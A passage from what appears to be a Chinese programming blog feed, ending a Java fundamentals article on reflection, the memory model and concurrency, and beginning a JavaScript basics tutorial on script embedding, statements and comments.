class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ObserverImpl</span> <span class="keyword">implements</span> <span class="title class_">Observer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">update</span><span class="params">(Observable o, Object arg)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;State changed to: &quot;</span> + arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="十五、反射机制深度解析"><a href="#十五、反射机制深度解析" class="headerlink" title="十五、反射机制深度解析"></a>十五、反射机制深度解析</h2><h3 id="1-反射核心API"><a href="#1-反射核心API" class="headerlink" title="1. 反射核心API"></a>1. 反射核心API</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取Class对象</span></span><br><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;com.example.MyClass&quot;</span>);</span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line">Class&lt;?&gt; clazz = MyClass.class;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建实例</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> clazz.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用方法</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;myMethod&quot;</span>, String.class);</span><br><span class="line">method.invoke(obj, <span class="string">&quot;param&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问私有字段</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;privateField&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">field.set(obj, <span class="string">&quot;value&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-反射应用场景"><a href="#2-反射应用场景" class="headerlink" title="2. 反射应用场景"></a>2. 反射应用场景</h3><ul>
<li><strong>框架开发</strong>：Spring IOC依赖注入</li>
<li><strong>动态代理</strong>：JDK动态代理</li>
<li><strong>序列化&#x2F;反序列化</strong>：JSON库（如Jackson）</li>
<li><strong>单元测试</strong>：访问私有成员</li>
</ul>
<h3 id="3-反射性能优化"><a href="#3-反射性能优化" class="headerlink" title="3. 反射性能优化"></a>3. 反射性能优化</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1. 缓存Method对象</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Method</span> <span class="variable">METHOD</span> <span class="operator">=</span> MyClass.class.getMethod(<span class="string">&quot;method&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 使用MethodHandle（JDK7+）</span></span><br><span class="line"><span class="type">MethodHandle</span> <span class="variable">handle</span> <span class="operator">=</span> MethodHandles.lookup().findVirtual(MyClass.class, <span class="string">&quot;method&quot;</span>, MethodType.methodType(<span class="keyword">void</span>.class));</span><br><span class="line">handle.invokeExact(obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 使用VarHandle（JDK9+）进行字段访问</span></span><br><span class="line"><span class="type">VarHandle</span> <span class="variable">handle</span> <span class="operator">=</span> MethodHandles.lookup().findVarHandle(MyClass.class, <span class="string">&quot;field&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">handle.set(obj, <span class="number">10</span>);</span><br></pre></td></tr></table></figure>

<h2 id="十六、JVM内存模型（JMM）"><a href="#十六、JVM内存模型（JMM）" class="headerlink" title="十六、JVM内存模型（JMM）"></a>十六、JVM内存模型（JMM）</h2><h3 id="1-主内存与工作内存"><a href="#1-主内存与工作内存" class="headerlink" title="1. 主内存与工作内存"></a>1. 主内存与工作内存</h3> <img src="/2026/01/02/Java%E5%9F%BA%E7%A1%80/image_3.png" class="" title="在这里插入图片描述">

<h3 id="2-关键内存屏障"><a href="#2-关键内存屏障" class="headerlink" title="2. 关键内存屏障"></a>2. 关键内存屏障</h3><table>
<thead>
<tr>
<th>指令</th>
<th>作用</th>
<th>使用场景</th>
</tr>
</thead>
<tbody><tr>
<td><code>LoadLoad</code></td>
<td>确保加载指令顺序</td>
<td>读取共享变量前</td>
</tr>
<tr>
<td><code>StoreStore</code></td>
<td>确保存储指令顺序</td>
<td>写入共享变量后</td>
</tr>
<tr>
<td><code>LoadStore</code></td>
<td>确保加载在存储前完成</td>
<td>读写混合操作</td>
</tr>
<tr>
<td><code>StoreLoad</code></td>
<td>最强屏障，防止重排序</td>
<td>volatile写后读</td>
</tr>
</tbody></table>
<h3 id="3-volatile关键字原理"><a href="#3-volatile关键字原理" class="headerlink" title="3. volatile关键字原理"></a>3. volatile关键字原理</h3><ul>
<li><strong>保证可见性</strong>：写入时刷新到主内存，读取时从主内存加载</li>
<li><strong>禁止指令重排序</strong>：通过内存屏障实现</li>
<li><strong>不保证原子性</strong>：如<code>i++</code>操作（包含读-改-写三步）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正确使用volatile</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">boolean</span> <span class="variable">initialized</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程1</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">init</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// 初始化操作</span></span><br><span class="line">    initialized = <span class="literal">true</span>; <span class="comment">// 写入volatile变量</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线程2</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">use</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (initialized) &#123; <span class="comment">// 读取volatile变量</span></span><br><span class="line">        <span class="comment">// 可以安全使用初始化数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="十七、Java并发编程核心"><a href="#十七、Java并发编程核心" class="headerlink" title="十七、Java并发编程核心"></a>十七、Java并发编程核心</h2><h3 id="1-synchronized底层原理"><a href="#1-synchronized底层原理" class="headerlink" title="1. synchronized底层原理"></a>1. synchronized底层原理</h3><ul>
<li><strong>对象头结构</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Mark Word][Class Pointer][Lock Record]</span><br></pre></td></tr></table></figure></li>
<li><strong>锁升级过程</strong>：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">无锁 → 偏向锁 → 轻量级锁 → 重量级锁</span><br></pre></td></tr></table></figure></li>
<li><strong>锁消除</strong>（JIT优化）：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 以下代码会被优化为无锁</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">method</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">synchronized</span>(<span class="keyword">new</span> <span class="title class_">Object</span>()) &#123;</span><br><span class="line">        <span class="comment">// 无共享数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2-Lock接口与AQS"><a href="#2-Lock接口与AQS" class="headerlink" title="2. Lock接口与AQS"></a>2. Lock接口与AQS</h3><ul>
<li><strong>ReentrantLock实现</strong>：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Lock</span> <span class="variable">lock</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReentrantLock</span>();</span><br><span class="line">lock.lock();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 临界区</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    lock.unlock();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><strong>AQS（AbstractQueuedSynchronizer）核心</strong>：<ul>
<li>维护一个CLH队列（FIFO）</li>
<li>通过CAS操作修改state字段</li>
<li>支持公平锁&#x2F;非公平锁</li>
</ul>
</li>
</ul>
<h3 id="3-并发工具类详解"><a href="#3-并发工具类详解" class="headerlink" title="3. 并发工具类详解"></a>3. 并发工具类详解</h3><table>
<thead>
<tr>
<th>类</th>
<th>用途</th>
<th>示例</th>
</tr>
</thead>
<tbody><tr>
<td><code>CountDownLatch</code></td>
<td>计数器，等待多个线程完成</td>
<td><code>new CountDownLatch(3)</code></td>
</tr>
<tr>
<td><code>CyclicBarrier</code></td>
<td>循环屏障，等待固定数量线程</td>
<td><code>new CyclicBarrier(3)</code></td>
</tr>
<tr>
<td><code>Semaphore</code></td>
<td>信号量，控制并发数</td>
<td><code>new Semaphore(5)</code></td>
</tr>
<tr>
<td><code>Exchanger</code></td>
<td>线程间数据交换</td>
<td><code>exchanger.exchange(data)</code></td>
</tr>
<tr>
<td><code>Phaser</code></td>
<td>动态注册的屏障</td>
<td><code>phaser.register()</code></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Java基础</tag>
      </tags>
  </entry>
  <entry>
    <title>JavaScript基础详解</title>
    <url>/2025/12/06/JavaScript%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1. 概述"></a>1. 概述</h2><p>JavaScript是一种<strong>解释型</strong>、<strong>基于对象</strong>、<strong>动态类型</strong>的脚本语言，主要用于增强网页的交互性。它与Java没有关系，只是在诞生初期为了借助Java的热度而取了类似的名字。</p>
<ul>
<li><strong>解释型</strong>：不需要编译，由浏览器直接解释执行</li>
<li><strong>基于对象</strong>：支持面向对象编程，但没有类的概念（ES6之前）</li>
<li><strong>动态类型</strong>：变量类型在运行时确定，无需声明类型</li>
</ul>
<p>JavaScript主要运行在客户端浏览器中，但随着Node.js的发展，现在也可以在服务器端运行。</p>
<h3 id="为什么需要JavaScript？"><a href="#为什么需要JavaScript？" class="headerlink" title="为什么需要JavaScript？"></a>为什么需要JavaScript？</h3><ol>
<li><strong>交互性</strong>：创建动态网页效果（如表单验证、动画效果）</li>
<li><strong>异步通信</strong>：通过AJAX实现与服务器的异步通信</li>
<li><strong>操作DOM</strong>：动态修改网页内容和结构</li>
<li><strong>操作BOM</strong>：控制浏览器行为（如窗口、历史记录等）</li>
</ol>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 简单的JavaScript代码示例</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Hello, JavaScript!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表单验证示例</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">validateForm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> username = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;username&#x27;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (username.<span class="property">length</span> &lt; <span class="number">5</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;用户名至少需要5个字符&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-嵌入方法"><a href="#2-嵌入方法" class="headerlink" title="2. 嵌入方法"></a>2. 嵌入方法</h2><h3 id="2-1-内嵌式"><a href="#2-1-内嵌式" class="headerlink" title="2.1 内嵌式"></a>2.1 内嵌式</h3><p><strong>详细解释：</strong></p>
<ul>
<li>将JavaScript代码直接写在HTML文档的<code>&lt;script&gt;</code>标签中</li>
<li>通常放在<code>&lt;head&gt;</code>或<code>&lt;body&gt;</code>底部</li>
<li>优点：无需额外文件请求，代码与页面紧密结合</li>
<li>缺点：代码难以复用，HTML与JS混合导致维护困难</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>内嵌式示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 推荐写法：将脚本放在head中 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 使用type属性明确指定类型（现代浏览器可省略）</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="title function_">alert</span>(<span class="string">&quot;欢迎来到内嵌式JavaScript示例&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">        </span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 页面加载完成后执行</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;页面已加载&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;;</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;greet()&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 也可以放在body底部 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 在body底部执行，确保DOM已加载</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;这是在body底部添加的内容&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-2-外链式"><a href="#2-2-外链式" class="headerlink" title="2.2 外链式"></a>2.2 外链式</h3><p><strong>详细解释：</strong></p>
<ul>
<li>将JavaScript代码保存在单独的<code>.js</code>文件中</li>
<li>通过<code>&lt;script src=&quot;路径&quot;&gt;</code>标签引入</li>
<li>优点：代码复用性高，HTML与JS分离，便于维护</li>
<li>缺点：增加HTTP请求，可能影响页面加载速度</li>
</ul>
<p><strong>示例：</strong></p>
<ol>
<li>创建<code>script.js</code>文件：</li>
</ol>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// script.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sayHello</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`你好，<span class="subst">$&#123;name&#125;</span>！`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模块化示例</span></span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Calculator</span> = &#123;</span><br><span class="line">    <span class="attr">add</span>: <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> a + b;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">subtract</span>: <span class="keyword">function</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> a - b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用立即执行函数表达式(IIFE)避免全局污染</span></span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> privateVar = <span class="string">&quot;我是私有变量&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">privateFunction</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这是私有函数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 暴露公共接口</span></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">PublicAPI</span> = &#123;</span><br><span class="line">        <span class="attr">publicMethod</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;调用公共方法&quot;</span>);</span><br><span class="line">            <span class="title function_">privateFunction</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>在HTML中引入：</li>
</ol>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>外链式示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 引入外部JS文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 可以引入多个JS文件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;another-script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;sayHello(&#x27;张三&#x27;)&quot;</span>&gt;</span>打招呼<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;PublicAPI.publicMethod()&quot;</span>&gt;</span>调用公共方法<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 也可以在引入外部文件后继续写内嵌代码</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">document</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;DOMContentLoaded&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;DOM已加载&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-3-行内式"><a href="#2-3-行内式" class="headerlink" title="2.3 行内式"></a>2.3 行内式</h3><p><strong>详细解释：</strong></p>
<ul>
<li>直接将JavaScript代码写在HTML元素的事件属性中</li>
<li>通常用于简单的事件处理</li>
<li>优点：简单直接</li>
<li>缺点：代码难以维护，HTML与JS高度耦合</li>
</ul>
<p><strong>示例：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>行内式示例<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 简单的行内事件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;你好，世界！&#x27;)&quot;</span>&gt;</span>点击我<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 复杂一点的行内事件 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;请输入用户名&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        var name = document.getElementById(&#x27;username&#x27;).value;</span></span></span><br><span class="line"><span class="string"><span class="tag">        if (name) &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">            alert(&#x27;欢迎，&#x27; + name + &#x27;！&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="tag">        &#125; else &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">            alert(&#x27;请输入用户名&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="tag">        &#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">    &quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 使用事件属性的其他示例 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>=<span class="string">&quot;this.style.backgroundColor=&#x27;yellow&#x27;&quot;</span> </span></span><br><span class="line"><span class="tag">         <span class="attr">onmouseout</span>=<span class="string">&quot;this.style.backgroundColor=&#x27;white&#x27;&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">style</span>=<span class="string">&quot;padding: 20px; border: 1px solid #ccc;&quot;</span>&gt;</span></span><br><span class="line">        将鼠标移入此区域</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&lt;!-- 不推荐：复杂逻辑不应放在行内 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">        function calculateSum() &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">            var a = parseInt(prompt(&#x27;请输入第一个数字&#x27;));</span></span></span><br><span class="line"><span class="string"><span class="tag">            var b = parseInt(prompt(&#x27;请输入第二个数字&#x27;));</span></span></span><br><span class="line"><span class="string"><span class="tag">            if (!isNaN(a) &amp;&amp; !isNaN(b)) &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">                alert(&#x27;和为: &#x27; + (a + b));</span></span></span><br><span class="line"><span class="string"><span class="tag">            &#125; else &#123;</span></span></span><br><span class="line"><span class="string"><span class="tag">                alert(&#x27;请输入有效数字&#x27;);</span></span></span><br><span class="line"><span class="string"><span class="tag">            &#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">        &#125;</span></span></span><br><span class="line"><span class="string"><span class="tag">        calculateSum();</span></span></span><br><span class="line"><span class="string"><span class="tag">    &quot;</span>&gt;</span>计算和<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="3-语句"><a href="#3-语句" class="headerlink" title="3. 语句"></a>3. 语句</h2><p><strong>详细解释</strong></p>
<ul>
<li><strong>JavaScript语句</strong>：由值、运算符、表达式、关键词和注释组成的编程指令</li>
<li><strong>执行顺序</strong>：从上到下，从左到右</li>
<li><strong>分号</strong>：用于分隔JavaScript语句，虽然在大多数情况下可以省略（自动分号插入机制），但强烈建议显式添加</li>
</ul>
<p><strong>示例</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 基本语句示例</span></span><br><span class="line"><span class="keyword">var</span> x = <span class="number">5</span>;  <span class="comment">// 声明变量并赋值</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="number">10</span>; <span class="comment">// 声明变量并赋值</span></span><br><span class="line"><span class="keyword">var</span> z = x + y; <span class="comment">// 表达式语句</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多条语句可以写在同一行（不推荐）</span></span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>, b = <span class="number">2</span>, c = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 复合语句（代码块）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">var</span> message = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(message);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 条件语句</span></span><br><span class="line"><span class="keyword">if</span> (z &gt; <span class="number">10</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;z大于10&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;z不大于10&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 循环语句</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;循环次数: &quot;</span> + i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数声明</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">greet</span>(<span class="params">name</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;你好，&quot;</span> + name + <span class="string">&quot;！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数调用</span></span><br><span class="line"><span class="keyword">var</span> greeting = <span class="title function_">greet</span>(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(greeting);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 表达式语句</span></span><br><span class="line"><span class="number">3</span> + <span class="number">4</span>; <span class="comment">// 有效，但没有实际效果</span></span><br><span class="line"><span class="string">&quot;Hello&quot;</span>; <span class="comment">// 有效，但没有实际效果</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 空语句（分号单独一行）</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<h2 id="4-注释"><a href="#4-注释" class="headerlink" title="4. 注释"></a>4. 注释</h2><p><strong>详细解释</strong></p>
<ul>
<li><strong>单行注释</strong>：以<code>//</code>开头，直到行末</li>
<li><strong>多行注释</strong>：以<code>/*</code>开头，以<code>*/</code>结尾，可以跨多行</li>
<li><strong>作用</strong>：解释代码、临时禁用代码、文档生成</li>
<li><strong>最佳实践</strong>：保持注释简洁、准确，与代码同步更新</li>
</ul>
<p><strong>示例</strong></p>
